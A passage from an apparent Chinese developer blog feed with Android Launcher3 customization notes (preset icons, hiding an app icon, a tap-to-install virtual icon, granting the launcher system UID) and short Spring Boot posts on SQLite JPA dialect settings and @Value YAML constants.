class="line">&lt;favorite</span><br><span class="line">launcher:packageName=&quot;com.android.settings&quot;</span><br><span class="line">launcher:className=&quot;com.android.settings.Settings&quot;</span><br><span class="line">launcher:x=&quot;1&quot;/&gt;</span><br><span class="line">&lt;/folder&gt;</span><br></pre></td></tr></table></figure><h3 id="1-5、resolve-待机界面图标"><a href="#1-5、resolve-待机界面图标" class="headerlink" title="1.5、resolve(待机界面图标)"></a>1.5、resolve(待机界面图标)</h3><p>格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;resolve</span><br><span class="line">launcher:container=&quot;-101&quot;</span><br><span class="line">launcher:screen=&quot;1&quot;</span><br><span class="line">launcher:x=&quot;1&quot;</span><br><span class="line">launcher:y=&quot;0&quot; &gt;</span><br><span class="line">&lt;favorite</span><br><span class="line">launcher:uri=&quot;#Intent;action=android.intent.action.MAIN;category=android.intent.c</span><br><span class="line">ategory.APP_MESSAGING;end&quot; /&gt;</span><br><span class="line">&lt;favorite launcher:uri=&quot;sms:&quot; /&gt;</span><br><span class="line">&lt;favorite launcher:uri=&quot;smsto:&quot; /&gt;</span><br><span class="line">&lt;favorite launcher:uri=&quot;mms:&quot; /&gt;</span><br><span class="line">&lt;favorite launcher:uri=&quot;mmsto:&quot; /&gt;</span><br><span class="line">&lt;/resolve&gt;</span><br></pre></td></tr></table></figure><p>resolve 预置，一般预置需要自适应的应用图标，favorite 中配置 uri。</p><h3 id="1-6、预置-workspace-图标"><a href="#1-6、预置-workspace-图标" class="headerlink" title="1.6、预置 workspace 图标"></a>1.6、预置 workspace 图标</h3><p>用户可以直接修改如下 worksapce 待机界面图标布局文件。</p><p>packages\apps\Launcher3\res\xml\default_workspace_XXX.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;favorite</span><br><span class="line">launcher:screen=&quot;0&quot;</span><br><span class="line">launcher:x=&quot;-1&quot;</span><br><span class="line">launcher:y=&quot;-1&quot;</span><br><span class="line">launcher:packageName=&quot;com.android.settings&quot;</span><br><span class="line">launcher:className=&quot;com.android.settings.Settings&quot; /&gt;</span><br></pre></td></tr></table></figure><h3 id="1-7、预置-Hotseat-图标"><a href="#1-7、预置-Hotseat-图标" class="headerlink" title="1.7、预置 Hotseat 图标"></a>1.7、预置 Hotseat 图标</h3><p>Hotseat 图标位于待机界面最下面的一行，通常预置常驻应用，是在如下文件配置的。<br>Launcher3\res\xml\dw_tablet_hotseat.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;resolve</span><br><span class="line">launcher:container=&quot;-101&quot;</span><br><span class="line">launcher:screen=&quot;1&quot;</span><br><span class="line">launcher:x=&quot;1&quot; </span><br><span class="line">launcher:y=&quot;0&quot; &gt;</span><br><span class="line">&lt;favorite</span><br><span class="line">launcher:uri=&quot;#Intent;action=android.intent.action.MAIN;category=android.intent.c</span><br><span class="line">ategory.APP_MESSAGING;end&quot; /&gt; </span><br><span class="line">&lt;favorite launcher:uri=&quot;sms:&quot; /&gt;</span><br><span class="line">&lt;favorite launcher:uri=&quot;smsto:&quot; /&gt;</span><br><span class="line">&lt;favorite launcher:uri=&quot;mms:&quot; /&gt;</span><br><span class="line">&lt;favorite launcher:uri=&quot;mmsto:&quot; /&gt;</span><br><span class="line">&lt;/resolve&gt;</span><br></pre></td></tr></table></figure><h2 id="2、屏蔽应用程序的图标"><a href="#2、屏蔽应用程序的图标" class="headerlink" title="2、屏蔽应用程序的图标"></a>2、屏蔽应用程序的图标</h2><p>需求：在Launcher中屏蔽某个应用程序的图标，使其不显示在Launcher中。</p><p>补丁：<a href="mailto:&#x72;&#x6b;&#55;&#49;&#45;&#112;&#x61;&#99;&#x6b;&#x61;&#103;&#x65;&#115;&#45;&#x61;&#112;&#x70;&#115;&#x2d;&#108;&#x61;&#117;&#x6e;&#x63;&#104;&#101;&#114;&#51;&#64;&#109;&#97;&#115;&#x6b;&#95;&#x61;&#112;&#x70;&#x6c;&#105;&#x63;&#97;&#x74;&#x69;&#111;&#110;&#x5f;&#105;&#99;&#111;&#x6e;&#x5f;&#105;&#x6e;&#95;&#x6c;&#x61;&#117;&#x6e;&#99;&#104;&#101;&#114;&#x2e;&#x70;&#97;&#116;&#99;&#x68;">&#x72;&#x6b;&#55;&#49;&#45;&#112;&#x61;&#99;&#x6b;&#x61;&#103;&#x65;&#115;&#45;&#x61;&#112;&#x70;&#115;&#x2d;&#108;&#x61;&#117;&#x6e;&#x63;&#104;&#101;&#114;&#51;&#64;&#109;&#97;&#115;&#x6b;&#95;&#x61;&#112;&#x70;&#x6c;&#105;&#x63;&#97;&#x74;&#x69;&#111;&#110;&#x5f;&#105;&#99;&#111;&#x6e;&#x5f;&#105;&#x6e;&#95;&#x6c;&#x61;&#117;&#x6e;&#99;&#104;&#101;&#114;&#x2e;&#x70;&#97;&#116;&#99;&#x68;</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/com/android/launcher3/LauncherModel.java b/src/com/android/launcher3/LauncherModel.java</span><br><span class="line">index 3ac9773d9..42f4d0461 100644</span><br><span class="line">--- a/src/com/android/launcher3/LauncherModel.java</span><br><span class="line">+++ b/src/com/android/launcher3/LauncherModel.java</span><br><span class="line"></span><br><span class="line">@@ -2758,6 +2791,9 @@ public class LauncherModel extends BroadcastReceiver</span><br><span class="line">                 // Create the ApplicationInfos</span><br><span class="line">                 for (int i = 0; i &lt; apps.size(); i++) &#123;</span><br><span class="line">                     LauncherActivityInfoCompat app = apps.get(i);</span><br><span class="line">// hukaichao 20230729 @mask application icon in launcher@&#123;</span><br><span class="line">+                    if (&quot;com.example.led&quot;.equals(app.getComponentName().getPackageName())) &#123;</span><br><span class="line">+                        continue;</span><br><span class="line">+                    &#125;</span><br><span class="line">// hukaichao 20230729 @mask application icon in launcher@&#123;</span><br><span class="line">                     // This builds the icon bitmaps.</span><br><span class="line">                     mBgAllAppsList.add(new AppInfo(mContext, app, user, mIconCache, quietMode));</span><br><span class="line">                 &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3、-提供虚拟图标，在首次点击时触发安装过程"><a href="#3、-提供虚拟图标，在首次点击时触发安装过程" class="headerlink" title="3、 提供虚拟图标，在首次点击时触发安装过程"></a>3、 提供虚拟图标，在首次点击时触发安装过程</h2><p>补丁：<a href="mailto:&#114;&#x6b;&#55;&#49;&#95;&#112;&#97;&#x63;&#107;&#97;&#x67;&#101;&#115;&#x5f;&#97;&#x70;&#x70;&#115;&#x5f;&#x6c;&#97;&#x75;&#110;&#x63;&#104;&#x65;&#114;&#x33;&#64;&#x74;&#x72;&#105;&#x67;&#103;&#101;&#114;&#95;&#118;&#105;&#114;&#116;&#117;&#97;&#108;&#95;&#x69;&#99;&#x6f;&#x6e;&#95;&#105;&#x6e;&#x73;&#x74;&#x61;&#108;&#x6c;&#x5f;&#97;&#112;&#x6b;&#46;&#112;&#97;&#116;&#99;&#x68;">&#114;&#x6b;&#55;&#49;&#95;&#112;&#97;&#x63;&#107;&#97;&#x67;&#101;&#115;&#x5f;&#97;&#x70;&#x70;&#115;&#x5f;&#x6c;&#97;&#x75;&#110;&#x63;&#104;&#x65;&#114;&#x33;&#64;&#x74;&#x72;&#105;&#x67;&#103;&#101;&#114;&#95;&#118;&#105;&#114;&#116;&#117;&#97;&#108;&#95;&#x69;&#99;&#x6f;&#x6e;&#95;&#105;&#x6e;&#x73;&#x74;&#x61;&#108;&#x6c;&#x5f;&#97;&#112;&#x6b;&#46;&#112;&#97;&#116;&#99;&#x68;</a></p><p>说明：需要使用adb push将安装包先存入指定地点，然后点击虚拟图标即可安装该apk，在安装完成后再点击虚拟图标可进入该apk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/com/android/launcher3/LauncherModel.java b/src/com/android/launcher3/LauncherModel.java</span><br><span class="line">index 3ac9773d9..71820c467 100644</span><br><span class="line">--- a/src/com/android/launcher3/LauncherModel.java</span><br><span class="line">+++ b/src/com/android/launcher3/LauncherModel.java</span><br><span class="line">@@ -93,6 +93,7 @@ import java.util.Map;</span><br><span class="line"> import java.util.Map.Entry;</span><br><span class="line"> import java.util.Set;</span><br><span class="line"> import java.util.concurrent.Executor;</span><br><span class="line">+import java.io.File;</span><br><span class="line"> </span><br><span class="line"> /**</span><br><span class="line">  * Maintains in-memory state of the Launcher. It is expected that there should be only one</span><br><span class="line">@@ -1696,6 +1697,36 @@ public class LauncherModel extends BroadcastReceiver</span><br><span class="line">             LauncherSettings.Settings.call(contentResolver,</span><br><span class="line">                     LauncherSettings.Settings.METHOD_LOAD_DEFAULT_FAVORITES);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">// hukaichao 20230729 Provides a virtual icon that triggers the installation process on the first click@&#125;</span><br><span class="line">+            ContentValues valuesNew=new ContentValues();</span><br><span class="line">+            long aLong=LauncherSettings.Settings.call(contentResolver, LauncherSettings.Settings.METHOD_NEW_ITEM_ID)</span><br><span class="line">+                                        .getLong(LauncherSettings.Settings.EXTRA_VALUE);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites._ID,aLong);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.TITLE, &quot;Virtual&quot;);</span><br><span class="line">+            Intent installIntent = new Intent();</span><br><span class="line">+            installIntent.setComponent(new ComponentName(&quot;com.android.launcher3&quot;, &quot;com.android.launcher3.InstallApkActivity&quot;));</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.INTENT, installIntent.toUri(Intent.URI_INTENT_SCHEME));</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.CONTAINER, -100);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.SCREEN, 0);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.CELLX, 3);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.CELLY, 3);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.SPANX, 1);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.SPANY, 1);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.ITEM_TYPE, 1);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.APPWIDGET_ID, -1);</span><br><span class="line">+            Bitmap bitmap = android.graphics.BitmapFactory.decodeResource(mContext.getResources(), R.drawable.ic_info_launcher);</span><br><span class="line">+            java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream();</span><br><span class="line">+            bitmap.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);</span><br><span class="line">+            valuesNew.put(&quot;icon&quot;, byteArrayOutputStream.toByteArray());</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.MODIFIED, 0);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.RESTORED, 0);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.PROFILE_ID, 0);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.RANK, 0);</span><br><span class="line">+            valuesNew.put(LauncherSettings.Favorites.OPTIONS, 0);</span><br><span class="line">+            Uri uri=contentResolver.insert(LauncherSettings.Favorites.CONTENT_URI, valuesNew);</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">// hukaichao 20230729 Provides a virtual icon that triggers the installation process on the first click@&#125;</span><br><span class="line">             synchronized (sBgLock) &#123;</span><br><span class="line">                 clearSBgDataStructures();</span><br><span class="line">                 final HashMap&lt;String, Integer&gt; installingPkgs = PackageInstallerCompat</span><br><span class="line"></span><br><span class="line">                  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">diff --git a/src/com/android/launcher3/InstallApkActivity.java b/src/com/android/launcher3/InstallApkActivity.java</span><br><span class="line">new file mode 100644</span><br><span class="line">index 000000000..4583724f6</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/com/android/launcher3/InstallApkActivity.java</span><br><span class="line">@@ -0,0 +1,63 @@</span><br><span class="line">// hukaichao 20230729 Provides a virtual icon that triggers the installation process on the first click@&#123;</span><br><span class="line">+package com.android.launcher3;</span><br><span class="line">+</span><br><span class="line">+import android.app.Activity;</span><br><span class="line">+import android.content.Intent;</span><br><span class="line">+import android.content.pm.PackageManager;</span><br><span class="line">+import android.net.Uri;</span><br><span class="line">+import android.os.Bundle;</span><br><span class="line">+import android.util.Log;</span><br><span class="line">+import java.io.File;</span><br><span class="line">+import android.content.ComponentName;</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">+public class InstallApkActivity extends Activity &#123;</span><br><span class="line">+    private static final String PACKAGE_NAME_TO_INSTALL = &quot;com.example.launcherlearn2&quot;;</span><br><span class="line">+    private static final String TAG = &quot;InstallApkActivity&quot;;</span><br><span class="line">+</span><br><span class="line">+    @Override</span><br><span class="line">+    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">+        super.onCreate(savedInstanceState);</span><br><span class="line">+        Log.d(TAG, &quot;onCreate&quot;);</span><br><span class="line">+</span><br><span class="line">+        if (!isAppInstalled()) &#123;         </span><br><span class="line">+            installApp();</span><br><span class="line">+        &#125;</span><br><span class="line">+        if (isAppInstalled()) &#123;</span><br><span class="line">+            runApp();</span><br><span class="line">+        &#125;</span><br><span class="line">+    </span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    private boolean isAppInstalled() &#123;</span><br><span class="line">+        PackageManager pm = getPackageManager();</span><br><span class="line">+        try &#123;</span><br><span class="line">+            pm.getPackageInfo(PACKAGE_NAME_TO_INSTALL, PackageManager.GET_ACTIVITIES);</span><br><span class="line">+            Log.d(TAG, &quot;isAppInstalled: true&quot;);</span><br><span class="line">+            return true;</span><br><span class="line">+        &#125; catch (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">+            Log.d(TAG, &quot;isAppInstalled: false&quot;);</span><br><span class="line">+            return false;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    private void installApp() &#123;</span><br><span class="line">+        // 触发安装软件的逻辑</span><br><span class="line">+        Intent installIntent = new Intent(Intent.ACTION_VIEW);</span><br><span class="line">+        installIntent.setDataAndType(Uri.fromFile(new File(&quot;/data/app/launcherlearn.apk&quot;)), &quot;application/vnd.android.package-archive&quot;);</span><br><span class="line">+        installIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">+        startActivity(installIntent);</span><br><span class="line">+        Log.d(TAG, &quot;installApp Success&quot;);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    private void runApp()&#123;</span><br><span class="line">+        Intent intent = new Intent();</span><br><span class="line">+        intent.setComponent(new ComponentName(PACKAGE_NAME_TO_INSTALL, &quot;com.example.launcherlearn2.MainActivity&quot;));</span><br><span class="line">+        startActivity(intent);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">// hukaichao 20230729 Provides a virtual icon that triggers the installation process on the first click@&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">diff --git a/AndroidManifest.xml b/AndroidManifest.xml</span><br><span class="line">index 67dbdac30..c6062abe0 100644</span><br><span class="line">--- a/AndroidManifest.xml</span><br><span class="line">+++ b/AndroidManifest.xml</span><br><span class="line">@@ -19,7 +19,8 @@</span><br><span class="line"> --&gt;</span><br><span class="line"> &lt;manifest</span><br><span class="line">     xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">// hukaichao 20230729 Get permissions, otherwise you cannot add widgets@&#125;</span><br><span class="line">-    package=&quot;com.android.launcher3&quot;&gt;</span><br><span class="line">+    package=&quot;com.android.launcher3&quot;</span><br><span class="line">+    android:sharedUserId=&quot;android.uid.system&quot;&gt;</span><br><span class="line">// hukaichao 20230729 Get permissions, otherwise you cannot add widgets@&#125;</span><br><span class="line">     &lt;uses-sdk android:targetSdkVersion=&quot;23&quot; android:minSdkVersion=&quot;21&quot;/&gt;</span><br><span class="line">     &lt;!--</span><br><span class="line">     Manifest entries specific to Launcher3. This is merged with AndroidManifest-common.xml.</span><br><span class="line">@@ -96,6 +97,18 @@</span><br><span class="line">             &lt;/intent-filter&gt;</span><br><span class="line">         &lt;/activity&gt;</span><br><span class="line"> // hukaichao 20230729 Provides a virtual icon that triggers the installation process on the first click@&#125;</span><br><span class="line">+</span><br><span class="line">+        &lt;activity</span><br><span class="line">+            android:name=&quot;com.android.launcher3.InstallApkActivity&quot;</span><br><span class="line">+            android:theme=&quot;@style/LauncherTheme&quot;&gt;</span><br><span class="line">+            &lt;!-- 如果您需要在Launcher中显示快捷方式，请添加以下Intent过滤器 --&gt;</span><br><span class="line">+            &lt;intent-filter&gt;</span><br><span class="line">+                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;</span><br><span class="line">+                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;</span><br><span class="line">+            &lt;/intent-filter&gt;</span><br><span class="line">+        &lt;/activity&gt;</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">// hukaichao 20230729 Provides a virtual icon that triggers the installation process on the first click@&#125;</span><br><span class="line">         &lt;!--</span><br><span class="line">         The settings provider contains Home&#x27;s data, like the workspace favorites. The permissions</span><br><span class="line">         should be changed to what is defined above. The authorities should also be changed to</span><br></pre></td></tr></table></figure><h2 id="4、遇到问题"><a href="#4、遇到问题" class="headerlink" title="4、遇到问题"></a>4、遇到问题</h2><p>在图标定制中遇到一个问题：widget和shortcut添加不上，经金雨排查确定为权限问题，暴力添加权限方案如下：<br>在AndroidManifest.xml文件中添加一行 android:sharedUserId&#x3D;”android.uid.system”&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest</span><br><span class="line">    xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    package=&quot;com.android.launcher3&quot;</span><br><span class="line">    android:sharedUserId=&quot;android.uid.system&quot;&gt;</span><br></pre></td></tr></table></figure><p>在Android.mk文件中添加一行 LOCAL_CERTIFICATE :&#x3D; platform</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_JACK_COVERAGE_INCLUDE_FILTER := com.android.launcher3.*</span><br><span class="line">LOCAL_CERTIFICATE := platform</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlite jpa 数据源设置问题</title>
    <link href="/2023/08/09/sqlite%20jpa%20%E6%95%B0%E6%8D%AE%E6%BA%90%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    <url>/2023/08/09/sqlite%20jpa%20%E6%95%B0%E6%8D%AE%E6%BA%90%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>springboot项目中，采用spring data jpa 连接sqlite数据库dialect设置问题：<br>在之前的旧版本中配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jpa:</span><br><span class="line">  show-sql: true</span><br><span class="line">  hibernate:</span><br><span class="line">    ddl-auto: update</span><br><span class="line">  database-platform: org.hibernate.dialect.SQLiteDialect</span><br></pre></td></tr></table></figure><p>但是在一年前左右的一次更新中，将包名进行了修改，所以正确的dialect设置为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jpa:</span><br><span class="line">  hibernate:</span><br><span class="line">    ddl-auto: update</span><br><span class="line">    naming:</span><br><span class="line">      physical-strategy: org.hibernate.boot.model.naming.PhysicalNamingStrategyStandardImpl</span><br><span class="line">  properties:</span><br><span class="line">    hibernate:</span><br><span class="line">      dialect: org.sqlite.hibernate.dialect.SQLiteDialect</span><br><span class="line">  show-sql: true</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot通过@value注解获取yaml文件常量</title>
    <link href="/2023/08/09/SpringBoot%E9%80%9A%E8%BF%87@value%E6%B3%A8%E8%A7%A3%E8%8E%B7%E5%8F%96yaml%E6%96%87%E4%BB%B6%E5%B8%B8%E9%87%8F/"/>
    <url>/2023/08/09/SpringBoot%E9%80%9A%E8%BF%87@value%E6%B3%A8%E8%A7%A3%E8%8E%B7%E5%8F%96yaml%E6%96%87%E4%BB%B6%E5%B8%B8%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<p>尝试了下获取数组和Map，都失败了，最后获取的String常量成功了，然后将字符串拆分得到数组和Map</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public class ConstantDynamic &#123;</span><br><span class="line"></span><br><span class="line">    @Value(&quot;$&#123;constant.thumbnail.save-folder&#125;&quot;)</span><br><span class="line">    private String thumbnailSaveFolder;</span><br><span class="line"></span><br><span class="line">    @Value(&quot;$&#123;constant.ai.work-directory&#125;&quot;)</span><br><span class="line">    private String aiServerWorkDirectory;</span><br><span class="line"></span><br><span class="line">    @Value(&quot;$&#123;constant.ai.python-command&#125;&quot;)</span><br><span class="line">    private String aiServerPythonCommand;</span><br><span class="line"></span><br><span class="line">    @Value(&quot;$&#123;constant.ai.script-path&#125;&quot;)</span><br><span class="line">    private String aiServerScriptPath;</span><br><span class="line"></span><br><span class="line">    @Value(&quot;$&#123;constant.ai.categorys&#125;&quot;)</span><br><span class="line">    private String categoryString;</span><br><span class="line"></span><br><span class="line">    private String[] categories;</span><br><span class="line"></span><br><span class="line">    private Map&lt;String, Integer&gt; categoryMap = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    @PostConstruct</span><br><span class="line">    private void init() &#123;</span><br><span class="line">        categories = categoryString.split(&quot;,&quot;);</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; categories.length; i++) &#123;</span><br><span class="line">            categoryMap.put(categories[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>yaml文件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">constant:</span><br><span class="line">  thumbnail:</span><br><span class="line">    save-folder: data/thumbnail</span><br><span class="line">  ai:</span><br><span class="line">    work-directory: ai_server</span><br><span class="line">    python-command: ai_server/env/Scripts/python.exe</span><br><span class="line">    script-path: ai_server/NasServer.py</span><br><span class="line">    categorys: A1_1身份证,A1_2证件,A1_3名片</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java实现文件监听</title>
    <link href="/2023/08/09/Java%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E7%9B%91%E5%90%AC/"/>
    <url>/2023/08/09/Java%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E7%9B%91%E5%90%AC/</url>
    
